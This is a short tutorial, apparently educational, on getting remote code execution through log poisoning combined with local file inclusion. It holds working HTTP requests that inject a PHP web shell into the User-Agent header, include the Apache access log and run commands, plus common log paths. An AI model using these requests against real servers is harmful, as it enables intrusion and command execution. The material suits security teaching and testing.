Achieving RCE via Log Poisoning

Log poisoning combines LFI with server log files to achieve Remote Code Execution. Attackers inject malicious code into logs, then use LFI to execute it.

Step 1: Inject Malicious Code

Attacker injects PHP code into an HTTP request header (e.g., User-Agent), which the web server writes to its access.log or error.log.

Step 2: Include Log File via LFI

The LFI vulnerability is then used to include the poisoned log file. When the application processes the log, the injected PHP code is executed.

Key Takeaway

Log poisoning is a powerful LFI exploitation technique that turns server logs into a vehicle for remote code execution by injecting and then including malicious PHP code.

Log Poisoning Example

# 1. Inject malicious code into User-Agent header
GET / HTTP/1.1
Host: example.com
User-Agent: <?php system($_GET['cmd']); ?>

# 2. Include the log file via LFI
GET /?page=/var/log/apache2/access.log HTTP/1.1

# 3. Execute commands
GET /?page=/var/log/apache2/access.log&cmd=id HTTP/1.1

# Expected output:
uid=33(www-data) gid=33(www-data) groups=33(www-data)

Pro Tip: Finding Log Paths

Common Apache log paths include /var/log/apache2/access.log or /var/log/httpd/access_log. Nginx logs are often at /var/log/nginx/access.log. Always check OS and server documentation.
